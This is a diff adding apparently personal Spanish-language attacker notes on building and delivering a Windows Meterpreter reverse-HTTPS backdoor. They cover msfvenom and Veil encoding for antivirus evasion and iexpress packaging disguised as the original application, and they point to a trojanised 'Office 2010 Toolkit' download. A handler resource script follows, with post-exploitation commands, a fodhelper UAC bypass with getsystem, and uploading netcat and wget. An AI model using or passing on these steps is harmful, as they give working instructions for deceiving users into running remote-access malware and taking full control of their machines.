@@ -1,0 +1,66 @@
+msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=PORT -e x86/shikata_ga_nai -i 10 -f exe > payload.exe (-i = iteración) (LPORT usar 443 siempre para exterior)
+
+kneda.net/Office%202010%20Toolkit.exe
+kneda/documentos
+
+VEIL => use 1
+	python/meterpreter/rev_https.py
+	use 27
+	LHOST, LPORT (443), USE_PYHERION
+	set LHOST IP
+	set LPORT PORT
+	set USE_PYHERION Y
+	generate (usar opcion 1, no el py2exe)
+
+iexpress (EJECUTAR COMO ADMINISTRADOR)
+	Package Title: Nombre de la app original para que no se sospeche
+	Package Name and Options: La última, Store files using...
+	No restart
+	Don't save
+
+
+msfconsole
+	exploits => atacan vulnerabilidades
+	auxiliary => ayudan a reconocer vulnerabilidades
+	post => ejemplo: checkvm (saber si es una VM)
+	payloads => carga útil (pero usamos veil mejor)
+	encoders => ofuscar el código
+	nops => kk
+	evasion => evadir antivirus (windows_defender_exe)
+	
+	show advanced
+	ExitOnSession false, para que todos los que se conecten establezcan conexión, no solo el primero
+	use PAYLOAD windows/meterpreter/reverse_https
+	SIEMPRE MIGRAR AL EXPLORER.EXE
+	AutoRunScript
+	exploit -j para usar formato java en texto plano. Deja a la escucha el handler
+
+///////////// SCRIPT autoScript.rc /////////////
+use exploit/multi/handler
+set ExitOnSession false
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 192.168.233.3
+set LPORT 443
+set AutoRunScript migrate -n explorer.exe
+exploit -j
+///////////////////////////////////////////////
+
+msfconsole -r autoScript.rc
+
+sysinfo => Logged On Users : 2 (Usuario Windows y Administrador)
+search -f *.avi (o cualquier extensión)
+screenshot
+execute -f archivo.exe -i -H (Hidden) (Evitar usar shell, -f cmd.exe no falla)
+bg
+
+search bypassuac
+exploit/windows/local/bypassuac_fodhelper (Sale una ventana de Powershell momentáneamente)
+run
+Volver a la sesión y getsystem
+
+https://eternallybored.org/misc/netcat y wget
+upload netcat.exe y upload wget.exe
+
+Desde cmd.exe =>
+reg setval -k 
+Usar puerto 80, el 443 a veces lo capa
